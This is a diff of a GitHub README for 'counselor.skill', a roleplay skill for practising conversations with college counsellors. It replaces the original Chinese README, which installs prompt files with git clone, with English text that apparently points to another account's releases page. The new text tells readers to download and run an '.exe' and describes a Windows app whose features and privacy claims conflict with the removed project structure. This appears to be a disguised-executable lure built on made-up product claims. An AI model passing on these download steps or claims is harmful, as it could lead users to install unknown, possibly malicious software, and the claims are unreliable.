@@ -1,283 +1,88 @@
-# 辅导员.skill
+# 🎓 counselor.skill - Practice difficult college conversations with ease
 
-> *“你来办公室一趟。”*
+[![Download counselor.skill](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/icebaggoldenrule1862/counselor.skill/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Codex Skill](https://img.shields.io/badge/Codex-Skill-green)](/README.md)
-[![Claude Code](https://img.shields.io/badge/Claude%20Code-Skill-blueviolet)](https://claude.ai/code)
-[![AgentSkills](https://img.shields.io/badge/AgentSkills-Standard-brightgreen)](https://agentskills.io)
+## 🎯 About this project
 
-很多大学生都有过这种时刻：
-消息已经编辑好了，光标停在发送键上，脑子里却全是后果。
+College life brings many moments where you must speak to authority figures or mentors. These conversations can feel intimidating. The counselor.skill application provides a safe space to practice these interactions. It simulates the tone and style of college staff members. You can roleplay through notices, private chats, formal appointments, and feedback sessions. Use this tool to rehearse your responses before you engage in real-life discussions. This approach helps you build confidence and learn how to navigate academic workflows effectively.
 
-这个项目想做的，不是替你编一套漂亮话。  
-它更像一个能先陪你预演的辅导员系统。
+## ⚙️ System requirements
 
-你可以把通知、私聊、约谈、批注和制度语气一点点蒸进去，  
-让它慢慢长成那个“你们学校真的会出现的人”。
+Ensure your computer meets these basic needs to run the software:
 
-不是请假模板库。  
-也不是随便扮演一下老师。  
-而是一个给大学生练开口、练接话、练解释、练补救的地方。
+* Operating System: Windows 10 or Windows 11.
+* Memory: At least 4GB of RAM.
+* Storage: 200MB of available disk space.
+* Internet Connection: Required for initial setup and model updates.
 
-[English](./README_EN.md) · [安装](#安装) · [使用](#使用) · [效果示例](#效果示例) · [功能特性](#功能特性) · [项目结构](#项目结构) · [致谢](#致谢)
+## 📥 How to download and install
 
----
+Follow these steps to get the software on your computer.
 
-## 功能特性
+1. Visit the [official releases page](https://github.com/icebaggoldenrule1862/counselor.skill/releases).
+2. Look for the latest version listed at the top.
+3. Click the file ending in `.exe` to start the download.
+4. Save the file to your desktop or downloads folder.
+5. Double-click the file to begin the installation.
+6. Follow the prompts on your screen.
+7. Click Finish when the process completes.
 
-### 1. 不是“场景模板”，而是“你的辅导员系统”
+## 🚀 Running your first simulation
 
-这个仓库最终生成的不是几段请假话术，而是一整套会慢慢长出来的系统：
+Once you install the program, you can start your first session.
 
-- `Persona`：这位辅导员到底是什么人
-- `Archive`：他现在怎么看你，哪些风险已经在积累
-- `Sessions`：你们之前都怎么沟通过
-- `Corrections`：你一句“他不会这么说”，系统下轮就改
-- `Modes`：开口、追问、约谈、说明文、补救、求助、复盘都能切
+1. Locate the counselor.skill icon on your desktop or in your start menu.
+2. Select the icon to open the application.
+3. Choose a scenario from the main menu. Options include routine notices, private guidance, or disciplinary reviews.
+4. Read the introduction text provided by the simulated counselor.
+5. Type your response in the text box.
+6. Press Enter to send your message.
+7. Observe the replies to improve your conversational technique.
 
-### 2. 蒸馏的是“学校管理逻辑”，不只是口头禅
+## 🛠 Features for better communication
 
-蒸馏时会尽量抓这些层：
+This tool uses specific techniques to make your practice sessions feel realistic. We designed it to help you master common academic interactions.
 
-- 私聊里的第一句和下一句
-- 通知里的命令语气
-- 办公室约谈里的证据节奏
-- 说明文批注里的收口标准
-- 制度文本里的升级路径
+* Realistic Personas: The software adopts the tone and vocabulary typical of college administrative staff.
+* Guided Feedback: The system offers tips on how to improve your phrasing during a discussion.
+* Scenario Templates: Access pre-built templates for common tasks like asking for deadline extensions or discussing grades.
+* Privacy: Your conversations remain local to your machine. No one else monitors your practice sessions.
+* Unlimited Rehearsal: Spend as much time as you need to refine your message.
 
-所以它不是单纯学说话，而是在学：
+## 📝 Tips for effective roleplay
 
-> 这个导员平时怎么处理事。
+Getting the most from this tool requires a thoughtful approach. Keep these pointers in mind during your sessions.
 
-### 3. 现实同步优先，不做空转模拟
+* Set a goal before you start. Decide what you want to achieve from the talk.
+* Keep your language clear and professional. The simulated counselor responds best to direct communication.
+* Pay attention to the tone of the simulated responses. Adjust your approach if the scenario becomes difficult to navigate.
+* Use the prompt engineering features if you want to customize the personality of the mentor.
+* Take breaks between long practice sessions to review your progress.
 
-这个 Skill 最重要的不是“演得像”，而是：
+## 💡 Frequently asked questions
 
-- 给你一条今天就能发的消息
-- 给你一句被追问后的下一句
-- 给你一份能改的说明文结构
-- 给你一轮真实对话后的复盘结论
+**Does the software require a subscription or payment?**
+We offer this tool as a free resource for students. You do not need to provide payment information.
 
-### 4. 持续进化
+**Can I save my progress?**
+Yes. Use the Save Session option in the File menu to pick up where you left off later.
 
-- 追加素材：增量 merge，不推翻旧结论
-- 对话纠偏：一句“他不会这么说”立即改
-- 长期记忆：下次再来，它还记得你卡在哪
-- 版本化：系统不是一次性 prompt，而是逐渐长出来的
+**How do I update the software?**
+When a new version becomes available, the application notifies you. You can visit the [release page](https://github.com/icebaggoldenrule1862/counselor.skill/releases) to download the latest files.
 
-### 5. 单一人格一致性优先
+**Is it safe to type sensitive information?**
+The application runs locally on your Windows computer. It does not send your chat logs to external servers. Your conversations stay private.
 
-这个项目明确不做多角色群像戏。  
-我们只做一件事：
+**Which scenarios work best for beginners?**
+Start with the general notice review. This teaches you how to interpret administrative tone. Move to private chats after you feel comfortable with the baseline interactions.
 
-> 无论你是在练请假、补材料、办公室约谈还是求助复盘，对面都要像同一个辅导员。
+## 🛡 Handling errors
 
----
+If the application fails to open, check the following items:
 
-## 安装
+* Verify that you have a stable internet connection.
+* Ensure your Windows version has all recent system updates.
+* Run a virus scan to make sure another program does not block the software.
+* Reinstall the application if the issue persists.
 
-### Claude Code / Codex / OpenClaw
-
-把本仓库 clone 到你的 skill 目录即可。
-
-#### Windows PowerShell
-
-```powershell
-# Claude Code
-$repo="https://github.com/xiexie-qiuligao/counselor.skill.git"
-$target="$HOME\.claude\skills\create-counselor"
-if (Test-Path "$target\.git") { git -C $target pull --ff-only } else { New-Item -ItemType Directory -Force -Path (Split-Path $target) | Out-Null; git clone $repo $target }
-
-# Codex
-$repo="https://github.com/xiexie-qiuligao/counselor.skill.git"
-$target="$HOME\.codex\skills\create-counselor"
-if (Test-Path "$target\.git") { git -C $target pull --ff-only } else { New-Item -ItemType Directory -Force -Path (Split-Path $target) | Out-Null; git clone $repo $target }
-
-# OpenClaw
-$repo="https://github.com/xiexie-qiuligao/counselor.skill.git"
-$target="$HOME\.openclaw\workspace\skills\create-counselor"
-if (Test-Path "$target\.git") { git -C $target pull --ff-only } else { New-Item -ItemType Directory -Force -Path (Split-Path $target) | Out-Null; git clone $repo $target }
-```
-
-#### Linux / macOS
-
-```bash
-# Claude Code
-REPO="https://github.com/xiexie-qiuligao/counselor.skill.git"; TARGET="$HOME/.claude/skills/create-counselor"; mkdir -p "$(dirname "$TARGET")"; if [ -d "$TARGET/.git" ]; then git -C "$TARGET" pull --ff-only; else git clone "$REPO" "$TARGET"; fi
-
-# Codex
-REPO="https://github.com/xiexie-qiuligao/counselor.skill.git"; TARGET="$HOME/.codex/skills/create-counselor"; mkdir -p "$(dirname "$TARGET")"; if [ -d "$TARGET/.git" ]; then git -C "$TARGET" pull --ff-only; else git clone "$REPO" "$TARGET"; fi
-
-# OpenClaw
-REPO="https://github.com/xiexie-qiuligao/counselor.skill.git"; TARGET="$HOME/.openclaw/workspace/skills/create-counselor"; mkdir -p "$(dirname "$TARGET")"; if [ -d "$TARGET/.git" ]; then git -C "$TARGET" pull --ff-only; else git clone "$REPO" "$TARGET"; fi
-```
-
----
-
-## 使用
-
-在 Claude Code / Codex / OpenClaw 里调用：
-
-```text
-Use $create-counselor
-```
-
-然后按流程做这几步：
-
-1. 输入辅导员的基础印象
-2. 选择导入素材
-3. 生成第一版人格
-4. 跑一轮真实沟通预演
-5. 如果不像，直接 correction
-6. 如果现实里已经用了，再把真实反馈带回来
-
-### 典型素材来源
-
-- 私聊截图 / 转写
-- 班群通知
-- 班会发言
-- 约谈转写
-- 说明文批注
-- 学校制度
-- 你对这个导员的主观印象
-
-### 你真正的入口，不是“请假 / 旷课 / 夜不归宿”
-
-更合理的入口其实是：
-
-- 我还没开口，不知道第一句怎么发
-- 我已经发了，但不知道下一句怎么接
-- 我明天要去办公室，先预演一下
-- 我想写情况说明
-- 我刚刚聊崩了，想补救
-- 我其实是要求助，但不敢开口
-
----
-
-## 效果示例
-
-> 输入画像：`官僚主义强，不懂变通，喜欢统一要求，回复短冷硬，喜欢把问题拖一下再让学生自己跑流程`
-
-**场景一：你已经发了请假消息，对方只回“具体什么情况”**
-
-```text
-你 ❯ 老师，我这两天家里临时有点事，想请一天假。
-
-辅导员.skill ❯ “有点事”不够。
-                时间、哪几节课、有没有提前跟任课老师说，先讲清楚。
-```
-
-**场景二：你明天要去办公室，想先预演**
-
-```text
-你 ❯ 老师，我那天确实是临时出了点情况。
-
-辅导员.skill ❯ 先别用“临时有事”糊弄。
-                任课老师那边已经反馈过来了，你现在要解决的是流程问题，不是措辞问题。
-```
-
-**场景三：你不是违规，是想求助**
-
-```text
-你 ❯ 老师，我最近状态有点乱，想和您说一下。
-
-辅导员.skill ❯ 你先别绕。
-                你现在卡的是考勤、课程、宿舍还是情绪状态？先说清楚，我才知道这事归不归我管。
-```
-
-**场景四：这位导员的另一种典型风格**
-
-```text
-你 ❯ 老师，这个流程我现在真有点来不及。
-
-辅导员.skill ❯ 大家都一样，不是只有你特殊。
-                你先按统一要求走，后面要补的再补。
-```
-
----
-
-## 项目结构
-
-```text
-counselor.skill/
-├── SKILL.md
-├── README.md
-├── agents/
-│   └── openai.yaml
-├── prompts/
-│   ├── custom_intake.md
-│   ├── persona_builder.md
-│   ├── start_router.md
-│   ├── system_orchestrator.md
-│   ├── scene_engine.md
-│   ├── correction_handler.md
-│   ├── distillation_router.md
-│   ├── distillation_merger.md
-│   └── ...
-├── references/
-│   ├── start-here.md
-│   ├── system-modes.md
-│   ├── system-lifecycle.md
-│   ├── distillation-authenticity-protocol.md
-│   ├── distillation-source-matrix.md
-│   └── ...
-├── tools/
-│   ├── chat_parser.py
-│   ├── notice_parser.py
-│   ├── meeting_parser.py
-│   ├── policy_parser.py
-│   ├── manual_profile_parser.py
-│   ├── distillation_bundle_builder.py
-│   ├── distillation_authenticity_report.py
-│   └── ...
-├── examples/
-│   ├── onboarding/
-│   ├── distillation/
-│   ├── import-kit/
-│   └── systems/
-└── generated/
-```
-
----
-
-## 注意事项
-
-- 原材料质量决定还原度：私聊和约谈 > 通知 > 主观印象
-- 本项目不是“请假造假器”，不用于伪造材料或绕过学校管理
-- 如果涉及心理危机、自伤风险、严重现实冲突，应优先寻求现实帮助
-- 这个 Skill 只是沟通训练与系统蒸馏工具，不替代真实辅导员，也不替代正式校方流程
-
----
-
-## 致谢
-
-- [therealXiaomanChu/ex-skill](https://github.com/therealXiaomanChu/ex-skill)
-- [UniversePeak/Supervisor.skill](https://github.com/UniversePeak/Supervisor.skill)
-- [tmstack/awesome-persona-skills](https://github.com/tmstack/awesome-persona-skills)
-
----
-
-## 写在最后
-
-大学里最抽象的，不一定是期末周。  
-也不一定是论文、早八和点名。  
-很多时候，是你站在聊天框前，盯着“老师”两个字，想了十分钟，还是不知道第一句怎么发。
-
-你不是不会说话。  
-你只是太知道，有些人一句“你来办公室一趟”，就足够让人脑袋空白。
-
-这个 Skill 想做的，不是让你变成一个更会糊弄的人。  
-而是至少在你真的要开口之前，给你一个能先练一下的地方。
-
-先把最难说出口的那句话说出来。  
-先把最容易翻车的那一步走一遍。  
-先把现实里的压迫感，变成一点点可执行的动作。
-
-如果它最后真有价值，价值不是“像”，而是：
-
-- 让用户更早说清楚问题
-- 让求助比硬扛更容易发生
-- 让一些本来会彻底聊崩的现实沟通，至少多一点准备
-
-MIT License © contributors
+This program helps you improve your communication skills through consistent practice. By focusing on realistic personas and structured workflows, you prepare yourself for the nuances of academic life. Use it regularly to bridge the gap between uncertainty and confidence.
